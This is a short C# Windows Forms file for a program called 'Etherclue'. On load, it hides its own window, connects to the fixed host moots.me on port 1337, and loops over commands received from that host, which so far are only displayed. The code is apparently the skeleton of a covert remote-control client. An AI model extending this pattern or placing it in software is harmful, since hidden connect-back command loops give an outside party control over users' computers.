using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Etherclue
{
    public partial class EtherclueMain : Form
    {
        Encryption encryption = new Encryption();
        clsSocket socket;
        public EtherclueMain()
        {
            InitializeComponent();
        }

        private void EtherclueMain_Shown(object sender, EventArgs e)
        {
            
        }

        private void CheckCommand(string cmd)
        {
            MessageBox.Show(cmd);
            socket.Send("Testing");
        }

        private void EtherclueMain_Load(object sender, EventArgs e)
        {
            socket = new clsSocket("moots.me", 1337);
            this.Hide();
            socket.Send("Test");
            while (socket.IsConnected())
            {
                CheckCommand(socket.Receive());
            }
        }
    }
}
